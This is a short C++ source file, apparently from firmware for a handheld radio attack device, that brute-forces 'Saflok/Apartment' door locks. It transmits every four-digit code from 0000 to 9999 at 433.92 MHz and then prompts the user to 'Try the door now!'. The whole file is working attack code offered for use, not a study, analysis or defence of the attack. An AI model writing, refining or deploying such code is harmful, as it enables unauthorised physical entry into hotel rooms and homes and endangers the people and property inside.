// saflok.cpp
#include "saflok.h"
#include "../hardware/hw_radio.h"
#include "../ui/ui_draw.h"
void saflok_run(cyd_state_t* state) {
    cyd_draw_attack("Saflock/Apartment");
    cyd_draw_log("Brute door codes...");
    for(int code=0; code<10000; code++) {
        radio_send_code(433920000, 3, code);
        delay(22);
    }
    cyd_draw_green_light("Try the door now!");
}
